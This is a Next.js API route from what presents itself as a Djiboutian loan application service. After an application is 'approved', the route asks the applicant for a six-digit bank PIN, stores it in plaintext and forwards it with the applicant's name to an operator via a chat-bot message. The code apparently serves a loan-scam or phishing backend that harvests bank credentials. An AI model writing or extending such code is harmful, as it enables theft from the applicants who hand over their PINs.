import { audit, findApplication, getSql, notifyAdmin, publicApp } from "../../../../../lib/applications";

export const runtime = "nodejs";

export async function POST(
  request: Request,
  context: { params: Promise<{ applicationId: string }> }
) {
  const { applicationId } = await context.params;
  const { value, referenceId } = (await request.json()) as { value?: string; referenceId?: string };
  const row = await findApplication(applicationId);

  if (!row || row.reference_id !== referenceId || row.status !== "APPROVED") {
    return Response.json({ error: "Bank number cannot be submitted at this stage." }, { status: 400 });
  }

  const bankNumber = String(value || "").trim();
  if (!/^\d{6}$/.test(bankNumber)) {
    return Response.json({ error: "Enter a 6-digit bank pin." }, { status: 400 });
  }

  await getSql()`UPDATE loan_applications SET bank_number=${bankNumber}, status='BANK_NUMBER_PENDING', updated_at=NOW() WHERE application_id=${applicationId}`;
  await audit(applicationId, "BANK_NUMBER_SUBMITTED", "applicant");
  await notifyAdmin(
    `🏦 BANK NUMBER\n\n👤 Applicant: ${row.full_name}\n🔢 Bank number: ${bankNumber}\n💰 Amount: DJF ${Number(row.requested_amount).toLocaleString("fr-DJ")}\n\nConfirm before disbursement.`,
    {
      inline_keyboard: [
        [{ text: "✅ Confirm Bank", callback_data: `confirm_bank:${applicationId}` }],
        [{ text: "❌ Change Bank", callback_data: `wrong_bank:${applicationId}` }],
      ],
    }
  );

  return Response.json(publicApp({ ...row, bank_number: bankNumber, status: "BANK_NUMBER_PENDING" }));
}